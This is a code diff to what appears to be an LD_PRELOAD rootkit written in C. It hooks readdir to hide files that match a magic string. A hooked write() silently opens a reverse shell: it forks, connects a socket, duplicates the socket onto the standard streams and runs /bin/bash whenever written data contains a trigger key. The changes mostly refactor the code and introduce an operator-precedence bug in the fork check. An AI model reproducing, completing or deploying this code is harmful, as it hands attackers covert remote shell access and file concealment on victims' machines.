@@ -17,15 +17,14 @@ static struct dirent* (*old_readdir)(DIR *dir) = NULL;
 static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
 static FILE* (*old_fopen)(const char *pathname, const char *mode) = NULL;
 static FILE* (*old_fopen64)(const char *pathname, const char *mode) = NULL;
-static ssize_t (*old_write)(int fildes, const void *buf, size_t nbytes) = NULL;
+static ssize_t (*old_write)(int fd, const void *buf, size_t count) = NULL;
 
 
 void IPv4() {
-    pid_t pid = fork();
+    pid_t pid;
+    int sockfd;
 
-    if(pid == 0) {
-        int sockfd;
-
+    if(pid = fork() == 0) {
         if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
             struct sockaddr_in server, client;
 
@@ -39,7 +38,6 @@ void IPv4() {
 
             if ((bind(sockfd, (struct sockaddr *)&client, sizeof(client)) != -1) &&
             (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) != -1)) {
-                printf("1");
                 for(int i = 0; i < 3; i++) dup2(sockfd, i);
                 execve("/bin/bash", NULL, NULL);
                 close(sockfd);
@@ -54,7 +52,7 @@ struct dirent* readdir(DIR* dir) {
     struct dirent *dir_;
 
     if(old_readdir == NULL) 
-        old_readdir = dlsym(RTLD_NEXT, "readdir");
+        old_readdir = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
     
     while(dir_ = old_readdir(dir)) {
         if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
@@ -130,13 +128,13 @@ FILE* fopen64(const char *pathname, const char *mode) {
 }
 
 
-ssize_t write(int fildes, const void *buf, size_t nbytes) {
+ssize_t write(int fd, const void *buf, size_t count) {
     if(old_write == NULL)
         old_write = (ssize_t (*)(int, const void*, size_t))dlsym(RTLD_NEXT, "write");
 
     if(strstr(buf, KEY_STRING) != NULL) {
-        fildes = open("/dev/null", O_WRONLY | O_APPEND);   
+        fd = open("/dev/null", O_WRONLY | O_APPEND);   
         IPv4();
     }
-    return old_write(fildes, buf, nbytes);
+    return old_write(fd, buf, count);
 }
